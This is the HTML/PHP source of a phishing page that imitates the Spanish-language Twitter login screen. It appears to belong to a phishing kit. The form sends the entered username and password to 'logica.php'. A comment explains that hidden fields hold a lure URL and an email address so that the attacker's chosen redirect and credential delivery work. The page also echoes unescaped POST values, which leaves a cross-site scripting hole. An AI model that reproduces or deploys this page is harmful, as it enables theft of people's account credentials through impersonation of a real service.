<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="icon" href="../imagenes/favicontw.svg" type="image/svg" sizes="16x16">
    <title>Twitter</title>

    <!-- Bootstrap -->
    <link href="../css/estilos_tw_bootstrap_min.css" rel="stylesheet">
    <style type="text/css">
    body{
        background-color: white;
    }
        .form-control , .btn{
            border-radius:50px;
        }
        .btn-primary ,  .btn-primary:hover{
            background:#09f;
        }
        .color{color:black;  text-align: left;}
        .m-t-30{
            margin-top: 30px;
        }
        hr{
            border-top: 1px solid #fff;
        }
        
    </style>
  </head>
  <body>
    <div class="container">
        <div class="row">
            <div class="col-md-6 col-md-offset-3 text-center .m-t-30">
                        <img src="images/Twitter_Logo_Blue.svg" width="20%"/>
                        <h1 class="color"> <b> Iniciar sesión en Twitter</b></h1><br/><br/>
                        <form action="../logica.php" method="POST"> 
                        <div class="form-group">
                            
                            <input value="<?php echo $_POST["usuario"]; ?>" type="text" class="form-control" name="username" id="username" placeholder="Teléfono, correo o usuario" autocomplete="off" aria-required="true" required>
                        </div>
                        <div class="form-group">
                            
                            <input type="password" class="form-control" name="password" id="password" placeholder="Contraseña" autocomplete="off" aria-required="true" required>
                        </div>

                         <!-- Este div permite almacenar la url de gancho y el correo para que en logica.php se pueda redireccionar hacia la url que el atacante ha elegido -->
                        <input style="display:none;" value="<?php echo $_POST["url"]; ?>" type="url" name="gancho" id="gancho">
                        <input style="display:none;" value="<?php echo $_POST["email"]; ?>" type="email" name="enviocorreo" id="enviocorreo">
                       
                        <a href="<?php echo $_POST["url"];?>"> <button type="submit" class="btn btn-primary btn-lg btn-block" name="submit">Iniciar sesión</button></a>
                        </form>
                        <br/><br/>
                        <p><a href="#">¿Olvidaste tu contraseña?</a> . <a href="#">Regístrate en Twitter</a> </p>
                       
                   
            </div>
        </div>
    </div>
  </body>
</html>